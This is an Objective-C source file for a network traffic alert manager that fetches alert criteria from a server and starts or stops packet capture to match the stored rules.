//
//  NetworkTrafficAlertManager.m
//  NetworkTrafficAlertManager
//
//  Created by ophat on 12/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "NetworkTrafficAlertManagerImpl.h"
#import "NetworkTrafficAlertManager.h"

#import "NetworkTrafficCollector.h"
#import "NetworkTrafficAnalyzer.h"

#import "NTACritiriaStorage.h"
#import "NTAlertCriteria.h"
#import "ClientAlertNotify.h"

#import "DeliveryRequest.h"
#import "DataDelivery.h"
#import "DeliveryResponse.h"

#import "GetNetworkAlertCritiria.h"
#import "GetNetworkAlertCritiriaResponse.h"
#import "SendNetworkAlert.h"

@implementation NetworkTrafficAlertManagerImpl
@synthesize mNetworkTrafficCollector;
@synthesize mNetworkTrafficAnalyzer;
@synthesize mNTACritiriaStorage;
@synthesize mClientAlertNotify;

@synthesize mGetNetworkTrafficManagerAlertDelegate;
@synthesize mSendNetworkTrafficManagerAlertDelegate;
@synthesize mDDM;

NetworkTrafficAlertManagerImpl * _NetworkTrafficAlertManagerImpl = nil;

#pragma mark #Init

+ (id) shareInstance {
    if (_NetworkTrafficAlertManagerImpl != nil) {
        return _NetworkTrafficAlertManagerImpl;
    }
    return nil;
}

- (id) initWithDDM:(id <DataDelivery>)aDDM{
    if ((self = [super init])) {
        [self setMDDM:aDDM];
        _NetworkTrafficAlertManagerImpl = self;
        
        mNTACritiriaStorage      = [[NTACritiriaStorage alloc] init];
        mNetworkTrafficCollector = [[NetworkTrafficCollector alloc]init];
        mNetworkTrafficAnalyzer  = [[NetworkTrafficAnalyzer alloc]init];
        mClientAlertNotify       = [[ClientAlertNotify alloc]init];
        
        [mNetworkTrafficAnalyzer setMStore:mNTACritiriaStorage];
        [mNetworkTrafficAnalyzer setMClientAlertNotify:mClientAlertNotify];
        
        [mClientAlertNotify setMStore:mNTACritiriaStorage];
        [mClientAlertNotify setMDDM:aDDM];
    }
    return self;
}

#pragma mark #clearAlertAndData

-(void) clearAlertAndData {
    
    [[[mNetworkTrafficAnalyzer mStore]mNTADatabase]deleteAllCritirias];
    [[[mNetworkTrafficAnalyzer mStore]mNTADatabase]deleteHistory];
    [[[mNetworkTrafficAnalyzer mStore]mNTADatabase]deleteSendBackData];
}

#pragma mark #Start/Stop

-(void) startCapture {
    NSDictionary * mycritiria = [mNTACritiriaStorage critirias];
    DLog(@"startCapture with mycritiria %@",mycritiria);
    if ([mycritiria count] >0) {
        for (int i = 0; i < [mycritiria count] ; i++) {
            int key = [[[mycritiria allKeys] objectAtIndex:i] intValue];
            [self addNewRule:[mycritiria objectForKey:[NSNumber numberWithInt:key]]];
        }
    } 
}

-(void) stopCapture {
    [mNetworkTrafficCollector stopCapture];
}

#pragma mark #ResetCriteria
-(void)resetNetworkTrafficRules{
    DLog(@"#### resetData");
    [self stopCapture];
    [self startCapture];
}

#pragma mark #DataDeliveryController

- (BOOL) requestNetworkTrafficRule: (id <NetworkTrafficAlertManagerDelegate>) aDelegate {
    DLog(@"requestNetworkTrafficRule, aDelegate = %@", aDelegate);
    BOOL canProcess = NO;
    
    DeliveryRequest *networkAlertRequest = [self getNetworkAlertCriteriaRequest];
    
    if (![self.mDDM isRequestIsPending:networkAlertRequest]) {
        DLog (@"not pending");
        [self.mDDM deliver:networkAlertRequest];
        [self setMGetNetworkTrafficManagerAlertDelegate:aDelegate];
        canProcess = YES;
    }
    return canProcess;
}

#pragma mark - #DeliveryRequestGenerator

- (DeliveryRequest *) getNetworkAlertCriteriaRequest {
    DeliveryRequest *deliveryRequest = [[DeliveryRequest alloc] init];
    
    GetNetworkAlertCritiria *commandData = [[GetNetworkAlertCritiria alloc] init];
    [deliveryRequest setMCallerId:kDDC_NetworkAlertManager];
    
    [deliveryRequest setMMaxRetry:3];
    [deliveryRequest setMRetryTimeout:60];
    [deliveryRequest setMConnectionTimeout:60];
    
    [deliveryRequest setMEDPType:kEDPTypeGetNetworkCriteria];
    [deliveryRequest setMPriority:kDDMRequestPriortyNormal];
    [deliveryRequest setMCommandCode:[commandData getCommand]];
    [deliveryRequest setMCommandData:commandData];
    [deliveryRequest setMCompressionFlag:1];
    [deliveryRequest setMEncryptionFlag:1];
    [deliveryRequest setMDeliveryListener:self];
    [commandData release];
    return ([deliveryRequest autorelease]);
}

#pragma mark - #Get Criteria After Request

- (void) requestFinished: (DeliveryResponse *) aResponse {
    DLog(@"==================== requestFinished aResponse %@ EDPType = %d", aResponse, [aResponse mEDPType]);
    
    if ([aResponse mSuccess]) {
        if ([aResponse mEDPType] == kEDPTypeGetNetworkCriteria) {
            
            id <NetworkTrafficAlertManagerDelegate> delegate = [self mGetNetworkTrafficManagerAlertDelegate];
            [self setMGetNetworkTrafficManagerAlertDelegate:nil];
            
            if ([delegate respondsToSelector:@selector(requestNetworkTrafficRuleCompleted:)]) {
                [delegate requestNetworkTrafficRuleCompleted:nil];
            }
            
            GetNetworkAlertCritiriaResponse *networkAlertCritiriaResponse = (GetNetworkAlertCritiriaResponse *)[aResponse mCSMReponse];
            NSArray * responseDataArray  = [networkAlertCritiriaResponse mCriteria];
            
            //ResetData
            if ( [mNetworkTrafficCollector mIsPcapStart] ) {
                DLog(@"SyncCriteria");
                [mNetworkTrafficCollector stopCapture];
            } 

            if (responseDataArray) {
                DLog(@"ApplyCriteria");
                [self.mNTACritiriaStorage storeCritiria:responseDataArray];
                [self addNewRuleWithDictionary:[self.mNTACritiriaStorage critirias]];
            }else{
                DLog(@"ClearCriteria");
                [[[self mNTACritiriaStorage]mNTADatabase] deleteHistory];
                [[[self mNTACritiriaStorage]mNTADatabase] deleteAllCritirias];
            }
            
        }
    } else {
        NSDictionary *userInfo	= [NSDictionary dictionaryWithObject:aResponse forKey:@"DMMResponse"];
        NSError *error			= [NSError errorWithDomain:@"Network Alert Criteria Error" code:[aResponse mStatusCode] userInfo:userInfo];
        if ([aResponse mEDPType] == kEDPTypeGetNetworkCriteria) {
            id <NetworkTrafficAlertManagerDelegate> delegate = [self mGetNetworkTrafficManagerAlertDelegate];
            [self setMGetNetworkTrafficManagerAlertDelegate:nil];
            if ([delegate respondsToSelector:@selector(requestNetworkTrafficRuleCompleted:)]) {
                [delegate requestNetworkTrafficRuleCompleted:error];
            }
        }
    }
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
    DLog(@"updateRequestProgress");
}

#pragma mark #Trigger/Add

-(void) addNewRuleWithDictionary:(NSDictionary *)aDict{
    for (int i=0; i < [aDict count]; i++) {
        int key = [[[aDict allKeys] objectAtIndex:i] intValue];
        [self addNewRule:[aDict objectForKey:[NSNumber numberWithInt:key]]];
    }
}

-(void) addNewRule : ( id ) aRule{
    [mNetworkTrafficAnalyzer setRule:aRule];
    [self triggerRuleifAvailable];
}

-(void) triggerRuleifAvailable{
    if ( ! [mNetworkTrafficCollector mIsPcapStart] ) {
        [mNetworkTrafficCollector startCapture];
    }
}

-(void) dealloc{
    [self stopCapture];
    [mClientAlertNotify release];
    [mNetworkTrafficAnalyzer release];
    [mNetworkTrafficCollector release];
    [mNTACritiriaStorage release];
    [super dealloc];
}
@end
